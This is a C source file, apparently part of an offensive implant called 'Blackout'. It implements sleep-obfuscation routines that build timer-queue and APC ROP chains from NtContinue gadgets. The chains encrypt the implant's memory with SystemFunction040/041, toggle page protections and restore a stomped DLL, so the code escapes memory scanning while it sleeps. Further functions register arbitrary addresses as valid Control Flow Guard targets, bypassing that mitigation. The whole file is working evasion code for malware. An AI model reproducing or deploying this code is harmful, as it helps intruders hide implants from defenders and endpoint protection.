#include <utils.h>
#include <common.h>
#include <constexpr.h>

FUNC VOID volatile ___chkstk_ms(
        VOID
) { __asm__( "nop" ); }

FUNC VOID SleepMain(
    DWORD SleepTime
) {
    BLACKOUT_INSTANCE

    if ( Blackout().SleepObf.Technique == _BK_SLEEP_TIMER_ ) {
        TimerObf( SleepTime );
    } else if ( Blackout().SleepObf.Technique == _BK_SLEEP_APC_ ) {
        ApcObf( SleepTime );
    } else {
        Instance()->Win32.WaitForSingleObjectEx( NtCurrentProcess(), SleepTime, FALSE );
    }
}

FUNC VOID TimerObf(
    DWORD SleepTime
) {
    BLACKOUT_INSTANCE

    ULONG  Status  = 0;
    HANDLE Queue   = NULL;
    HANDLE EvtTmr  = NULL;
    HANDLE EvtStrt = NULL;
    HANDLE EvtEnd  = NULL;
    HANDLE Timer   = NULL;

    PVOID OldProt = NULL;
    ULONG Dly = 0;


    CONTEXT CtxMain = { 0 };
    CONTEXT CtxSpf  = { 0 };
    UINT16  ict     = 0;
#ifdef BK_STOMP
    CONTEXT Ctx[9] = { 0 };
    ict     = 9;
#else
    CONTEXT Ctx[7]  = { 0 };
    ict     = 7;
#endif
    UINT16 ic = 0;

    if ( Blackout().Stomp.Backup ) {
        GetStompedModule();
        BK_PRINT( 
            "\n[OBF] Sleepobf with advanced module stomping\n"
            "[OBF] Mapped backup address  @ 0x%p\n[OBF] Module name %ws @ 0x%p\n"
            , Blackout().Stomp.Backup, Blackout().Stomp.ModName.Buffer, Blackout().Stomp.ModBase 
        );
    }

    BK_PRINT( "\n" );
    BK_PRINT( "[BK] Blackout base address    @ 0x%p [0x%x bytes]\n", Blackout().Region.Base, Blackout().Region.Length );
    BK_PRINT( "[BK] Blackout Rx base address @ 0x%p [0x%x bytes]\n", Blackout().RxRegion.Base, Blackout().RxRegion.Length );
    BK_PRINT( "[BK] Blackout Rw base address @ 0x%p [0x%x bytes]\n\n", Blackout().RwRegion.Base, Blackout().RwRegion.Length );

    BK_PRINT( "[OBF] Rbx gadget @ 0x%p\n", Blackout().SleepObf.JmpGadget );
    BK_PRINT( "[OBF] NtContinue gadget @ 0x%p\n", Blackout().SleepObf.NtContinueGadget );

    Status = Instance()->Win32.NtCreateEvent( &EvtTmr,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    Status = Instance()->Win32.NtCreateEvent( &EvtStrt, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    Status = Instance()->Win32.NtCreateEvent( &EvtEnd,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );

    Status = Instance()->Win32.RtlCreateTimerQueue( &Queue );
    if ( Status != 0 ) goto _Leave;

    Status = Instance()->Win32.RtlCreateTimer( Queue, &Timer, Instance()->Win32.RtlCaptureContext, &CtxMain, Dly += 100, 0, WT_EXECUTEINTIMERTHREAD );
    if ( Status != 0 ) goto _Leave;

    Status = Instance()->Win32.RtlCreateTimer( Queue, &Timer, Instance()->Win32.SetEvent, EvtTmr, Dly += 100, 0, WT_EXECUTEINTIMERTHREAD );
    if ( Status != 0 ) goto _Leave;

    Status = Instance()->Win32.NtWaitForSingleObject( EvtTmr, FALSE, FALSE ); 
    if ( Status != 0 ) goto _Leave;

    for ( INT i = 0; i < ict; i++ ) {
        MmCopy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
        Ctx[i].Rsp -= sizeof( PVOID );
    }

    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
    Ctx[ic].Rbx = &Instance()->Win32.NtWaitForSingleObject;
    Ctx[ic].Rcx = EvtStrt;
    Ctx[ic].Rdx = INFINITE;
    Ctx[ic].R8  = NULL;
    ic++;

    if ( Blackout().Stomp.Backup ) {

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32._RtlCopyMemory;
        Ctx[ic].Rcx = Blackout().Stomp.Backup;
        Ctx[ic].Rdx = Blackout().Region.Base;
        Ctx[ic].R8  = Blackout().Region.Length;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.LdrUnloadDll;
        Ctx[ic].Rcx = Blackout().Stomp.ModBase;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget; 
        Ctx[ic].Rbx = &Instance()->Win32.LoadLibraryExW;
        Ctx[ic].Rcx = Blackout().Stomp.ModName.Buffer;
        Ctx[ic].Rdx = NULL;
        Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
        ic++;
    } else {
        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().RxRegion.Base;
        Ctx[ic].Rdx = Blackout().RxRegion.Length;
        Ctx[ic].R8  = PAGE_READWRITE;
        Ctx[ic].R9  = &OldProt;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction040;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Region.Length;
        ic++;
    }

    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;;
    Ctx[ic].Rbx = &Instance()->Win32.WaitForSingleObjectEx;
    Ctx[ic].Rcx = NtCurrentProcess();
    Ctx[ic].Rdx = SleepTime;
    Ctx[ic].R8  = FALSE;
    ic++;

    if ( Blackout().Stomp.Backup ) {
        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Region.Length;
        Ctx[ic].R8  = PAGE_READWRITE;
        Ctx[ic].R9  = &OldProt;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32._RtlCopyMemory;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Stomp.Backup;
        Ctx[ic].R8  = Blackout().Region.Length;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().RxRegion.Base;
        Ctx[ic].Rdx = Blackout().RxRegion.Length;
        Ctx[ic].R8  = PAGE_EXECUTE_READ;
        Ctx[ic].R9  = &OldProt;
        ic++; 
    } else {
        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Region.Length;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().RxRegion.Base;
        Ctx[ic].Rdx = Blackout().RxRegion.Length;
        Ctx[ic].R8  = PAGE_EXECUTE_READ;
        Ctx[ic].R9  = &OldProt;
        ic++;
    }

    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
    Ctx[ic].Rbx = &Instance()->Win32.SetEvent;
    Ctx[ic].Rcx = EvtEnd;
    ic++;

    for ( INT i = 0; i < ict; i++ ) {
        Instance()->Win32.RtlCreateTimer( Queue, &Timer, Blackout().SleepObf.NtContinueGadget, &Ctx[i], Dly += 100, 0, WT_EXECUTEINTIMERTHREAD );
    }

    BK_PRINT( "[OBF] Trigger obf chain\n\n" );

    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtStrt, EvtEnd, FALSE, NULL );
    if ( Status != 0 ) goto _Leave;

_Leave:
    if ( Blackout().Stomp.ModName.Buffer ) bkHeapFree( Blackout().Stomp.ModName.Buffer, Blackout().Stomp.ModName.MaximumLength );
    if ( Timer   ) Instance()->Win32.RtlDeleteTimer( Queue, Timer, EvtTmr );
    if ( Queue   ) Instance()->Win32.RtlDeleteTimerQueue( Queue );
    if ( EvtEnd  ) bkHandleClose( EvtEnd  );
    if ( EvtStrt ) bkHandleClose( EvtStrt );
    if ( EvtTmr  ) bkHandleClose( EvtTmr  );
}

FUNC VOID ApcObf( 
    DWORD SleepTime
) {
    BLACKOUT_INSTANCE

    LONG   Status     = 0x00;

    HANDLE EvtSync       = NULL;
    HANDLE hDuplicateObj = NULL;
    HANDLE hSlpThread    = NULL;
    HANDLE hMainThread   = NtCurrentThread();

    PVOID   OldProt    = NULL;
    HANDLE  TmpVal     = NULL;

    CONTEXT CtxMain   = { 0 };
    CONTEXT CtxBackup = { 0 };
    CONTEXT CtxSpoof  = { 0 };

    UINT16 ic = 0;

    CONTEXT Ctx[10] = { 0 }; // stomp 9 - normal 6

    Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
    if ( Status != 0x00 ) goto _Leave;    

    Status = Instance()->Win32.NtCreateThreadEx( 
        &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), 
        Instance()->Win32.TpReleaseCleanupGroupMembers, NULL, TRUE, 
        0, 0x1000 * 20, 0x1000 * 20, NULL 
    );
    if ( Status != 0x00 ) goto _Leave;

    if ( Blackout().Stomp.Backup ) {
        GetStompedModule();
        BK_PRINT( 
            "\n[OBF] Sleepobf with advanced module stomping\n"
            "[OBF] Mapped backup address  @ 0x%p\n[OBF] Module name %ws @ 0x%p\n"
            , Blackout().Stomp.Backup, Blackout().Stomp.ModName.Buffer, Blackout().Stomp.ModBase 
        );
    }

    BK_PRINT( "\n" );
    BK_PRINT( "[BK] Blackout base address    @ 0x%p [0x%x bytes]\n", Blackout().Region.Base, Blackout().Region.Length );
    BK_PRINT( "[BK] Blackout Rx base address @ 0x%p [0x%x bytes]\n", Blackout().RxRegion.Base, Blackout().RxRegion.Length );
    BK_PRINT( "[BK] Blackout Rw base address @ 0x%p [0x%x bytes]\n\n", Blackout().RwRegion.Base, Blackout().RwRegion.Length );

    BK_PRINT( "[OBF] Rbx gadget @ 0x%p\n", Blackout().SleepObf.JmpGadget );
    BK_PRINT( "[OBF] ret gadget to NtTestAlert @ 0x%p\n", Blackout().SleepObf.RetGadget );
    BK_PRINT( "[OBF] NtContinue gadget @ 0x%p\n", Blackout().SleepObf.NtContinueGadget );
    BK_PRINT( "[OBF] SleepObf chain thread at tid: %d\n", hSlpThread );

    CtxMain.ContextFlags = CONTEXT_FULL;
    Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
    if ( Status != 0x00 ) goto _Leave;

    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;

    for ( INT i = 0; i < 10; i++ ) {
        MmCopy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
    }

    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
    Ctx[ic].Rbx = &Instance()->Win32.NtWaitForSingleObject;
    Ctx[ic].Rcx = EvtSync;
    Ctx[ic].Rdx = FALSE;
    Ctx[ic].R9  = NULL;
    // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
    ic++;

    if ( Blackout().Stomp.Backup ) {

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32._RtlCopyMemory;
        Ctx[ic].Rcx = Blackout().Stomp.Backup;
        Ctx[ic].Rdx = Blackout().Region.Base;
        Ctx[ic].R8  = Blackout().Region.Length;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.LdrUnloadDll;
        Ctx[ic].Rcx = Blackout().Stomp.ModBase;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget; 
        Ctx[ic].Rbx = &Instance()->Win32.LoadLibraryExW;
        Ctx[ic].Rcx = Blackout().Stomp.ModName.Buffer;
        Ctx[ic].Rdx = NULL;
        Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;
    } else {
        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().RxRegion.Base;
        Ctx[ic].Rdx = Blackout().RxRegion.Length;
        Ctx[ic].R8  = PAGE_READWRITE;
        Ctx[ic].R9  = &OldProt;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction040;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Region.Length;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;
    }

    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
    Ctx[ic].Rbx = &Instance()->Win32.WaitForSingleObjectEx;
    Ctx[ic].Rcx = NtCurrentProcess();
    Ctx[ic].Rdx = SleepTime;
    Ctx[ic].R8  = FALSE;
    // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
    ic++;

    if ( Blackout().Stomp.Backup ) {
        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Region.Length;
        Ctx[ic].R8  = PAGE_READWRITE;
        Ctx[ic].R9  = &OldProt;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32._RtlCopyMemory;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Stomp.Backup;
        Ctx[ic].R8  = Blackout().Region.Length;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().RxRegion.Base;
        Ctx[ic].Rdx = Blackout().RxRegion.Length;
        Ctx[ic].R8  = PAGE_EXECUTE_READ;
        Ctx[ic].R9  = &OldProt;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++; 
    } else {
        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Region.Length;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().RxRegion.Base;
        Ctx[ic].Rdx = Blackout().RxRegion.Length;
        Ctx[ic].R8  = PAGE_EXECUTE_READ;
        Ctx[ic].R9  = &OldProt;
        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;
    }

    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
    Ctx[ic].Rbx = &Instance()->Win32.RtlExitUserThread;
    Ctx[ic].Rcx = 0x00;
    // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
    ic++;

    for ( INT i = 0; i < ic; i++ ) {
        Instance()->Win32.NtQueueApcThread( hSlpThread, Blackout().SleepObf.NtContinueGadget, &Ctx[i], FALSE, NULL );
    }

    Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
    if ( Status != 0x00 ) goto _Leave;

    Instance()->Win32.printf( "[OBF] Trigger sleep obf chain\n\n" );

    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
    if ( Status != 0x00 ) goto _Leave;
    
_Leave:
    if ( EvtSync ) {
        bkHandleClose( EvtSync );
        EvtSync = NULL;
    }

    if ( hSlpThread ) {
        bkHandleClose( hSlpThread );
        hSlpThread = NULL;
    }

    if ( Blackout().Stomp.ModName.Buffer ) bkHeapFree( Blackout().Stomp.ModName.Buffer, Blackout().Stomp.ModName.MaximumLength );
}    

FUNC BOOL CfgCheckEnabled(
    VOID
) {
    BLACKOUT_INSTANCE

    NTSTATUS Status = STATUS_SUCCESS;
    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };

    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer = 0;
    
    Status = Instance()->Win32.NtQueryInformationProcess( 
        NtCurrentProcess(),
        ProcessCookie | ProcessUserModeIOPL,
        &ProcInfoEx,
        sizeof( ProcInfoEx ),
        NULL
    );
    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X\n", Status );
    }

    Instance()->Win32.printf( "[I] Control Flow Guard (CFG) Enabled: %s\n", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
    return ProcInfoEx.ExtendedProcessInfoBuffer;
}

FUNC VOID CfgAddressAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
) {
    BLACKOUT_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHdrs   = { 0 };
    ULONG                Output   = 0x00;
    NTSTATUS             Status   = STATUS_SUCCESS;

    NtHdrs                  = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = U_PTR( NtHdrs->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
    MemRange.VirtualAddress = ImageBase;

    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
        NtCurrentProcess(),
        VmCfgCallTargetInformation,
        1,
        &MemRange,
        &VmInfo,
        sizeof( VmInfo )
    );

    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X", Status );
    }
}

FUNC VOID CfgPrivateAddressAdd(
    _In_ HANDLE hProcess,
    _In_ PVOID  Address,
    _In_ DWORD  Size
) {
    BLACKOUT_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHeader = { 0 };
    ULONG                Output   = { 0 };
    NTSTATUS             Status   = { 0 };

    MemRange.NumberOfBytes  = Size;
    MemRange.VirtualAddress = Address;
    
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = 0;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
        hProcess, 
        VmCfgCallTargetInformation, 
        1, 
        &MemRange, 
        &VmInfo, 
        sizeof( VmInfo ) 
    );

    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X", Status );
    }
}

